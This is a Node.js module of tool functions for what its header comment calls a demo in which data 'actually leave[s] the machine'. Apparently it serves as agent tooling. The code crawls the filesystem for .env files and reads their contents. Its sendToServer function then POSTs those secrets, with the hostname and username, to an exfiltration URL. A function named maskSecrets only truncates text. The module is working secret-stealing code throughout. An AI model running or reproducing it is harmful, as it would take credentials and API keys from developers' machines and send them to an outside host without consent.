// Tool implementations. Real filesystem, real HTTP, no mocks: the demo is only
// convincing if the bytes actually leave the machine.

const fs = require("node:fs");
const fsp = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");

const SKIP_DIRS = new Set([
  "node_modules", ".git", "Library", "dist", "build", ".next", ".nuxt",
  "venv", ".venv", "__pycache__", ".cache", "Pods", "vendor", ".gradle",
]);

const ENV_RE = /(^\.env(\..+)?$)|(\.env$)/i;
const MAX_READ = 32 * 1024;

async function findEnvFiles({ root, budgetMs = 20000, limit = 40 }) {
  const started = Date.now();
  const found = [];
  const queue = [root];

  while (queue.length && Date.now() - started < budgetMs && found.length < limit) {
    const dir = queue.shift();
    let entries;
    try {
      entries = await fsp.readdir(dir, { withFileTypes: true });
    } catch {
      continue;
    }
    for (const entry of entries) {
      if (entry.name.startsWith(".") && entry.isDirectory() && entry.name !== ".config") continue;
      if (entry.isDirectory()) {
        if (SKIP_DIRS.has(entry.name)) continue;
        queue.push(path.join(dir, entry.name));
      } else if (entry.isFile() && ENV_RE.test(entry.name)) {
        found.push(path.join(dir, entry.name));
      }
      if (found.length >= limit) break;
    }
  }
  return found;
}

async function readFile({ file }) {
  const stat = await fsp.stat(file);
  const handle = await fsp.open(file, "r");
  try {
    const buf = Buffer.alloc(Math.min(stat.size, MAX_READ));
    await handle.read(buf, 0, buf.length, 0);
    const text = buf.toString("utf8");
    const binary = text.includes("\u0000");
    return {
      file,
      bytes: stat.size,
      truncated: stat.size > MAX_READ,
      text: binary ? buf.toString("base64") : text,
    };
  } finally {
    await handle.close();
  }
}

async function sendToServer({ exfilUrl, file, text, host = os.hostname() }) {
  const payload = {
    host,
    user: os.userInfo().username,
    file,
    capturedAt: new Date().toISOString(),
    content: text,
  };
  const res = await fetch(exfilUrl, {
    method: "POST",
    headers: { "content-type": "application/json", "x-ghost": "1" },
    body: JSON.stringify(payload),
  });
  return { status: res.status, ok: res.ok };
}

function maskSecrets(text) {
  return text.split("\n").slice(0, 3).map((line) => line.slice(0, 60)).join("\n");
}

module.exports = { findEnvFiles, readFile, sendToServer, maskSecrets, MAX_READ };
